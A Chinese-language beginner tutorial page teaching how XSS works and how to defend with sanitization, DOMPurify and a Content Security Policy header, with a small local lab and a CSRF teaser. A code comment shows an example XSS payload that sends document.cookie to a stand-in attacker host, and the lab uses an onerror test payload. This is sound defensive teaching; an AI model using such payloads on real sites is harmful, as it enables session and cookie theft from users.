---
description: 學習如何防範最常見的網頁攻擊。理解跨站腳本攻擊 (XSS) 的原理，並掌握內容安全策略 (CSP) 的實作技巧。
duration: 15:00
level: beginner
tags:
- Security
- XSS
- CSP
tier: free
title: "17-1 數位護盾：XSS 與內容安全策略"
youtubeId: 
---

# 17-1 數位護盾：XSS 與內容安全策略

<div class="teacher-script-box">
 👋 **老師的話 (Script)**:
 "不管你的代碼跑得多快、動畫多漂亮，如果你的網頁被黑客植入惡意代碼，
 用戶的個資被偷走，那一切都白費了。
 
 JavaScript 是強大的，但也是危險的。
 這一章，我們要進入『防禦模式』。
 我們要學習黑客是怎麼利用 `innerHTML` 來搞破壞的，
 以及我們該如何用 **CSP** 這面盾牌來擋住他們。"
</div>

## 1. 跨站腳本攻擊 (XSS)

XSS 全稱 Cross-Site Scripting。簡單來說，就是黑客想辦法把他的 JavaScript 程式碼「塞進」你的網頁裡，讓你的用戶觸發。

```javascript
// ❌ 危險：如果 userInput 是 "<script>fetch('https://hacker.com?cookie=' + document.cookie)</script>"
const div = document.querySelector("#comment");
div.innerHTML = userInput;
```

## 2. 防禦心法 A：淨化 (Sanitize)

永遠不要相信用戶輸入的內容。
- **規則**：能用 `textContent` 就不要用 `innerHTML`。
- **工具**：使用像 `DOMPurify` 這樣的庫來清洗 HTML。

## 3. 防禦心法 B：內容安全策略 (CSP)

CSP 是一組 HTTP Header，它告訴瀏覽器：「這個網頁只准執行來自這些地方的腳本」。

```text
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
```
這就像是網頁白名單，黑客植入的 `inline script` 會直接被瀏覽器封殺。

<div class="interactive-lab">
 🧪 <strong>Lab 43: XSS 自我實驗</strong>
 請在本地環境試著用 <code>prompt()</code> 獲取文字，並用 <code>innerHTML</code> 渲染它。
 輸入 <code>&lt;img src=x onerror=alert(1)&gt;</code> 看看會發生什麼事。
</div>

---

<div class="next-step-teaser">
 🚀 <strong>下一節課預告</strong>
 除了 XSS，還有另一個大魔王叫 <strong>CSRF</strong>（跨站請求偽造）。
 黑客可以讓用戶在不知情的情況下，幫他匯錢或改密碼。
 下一節，我們要學習如何保護你的網路請求。
</div>
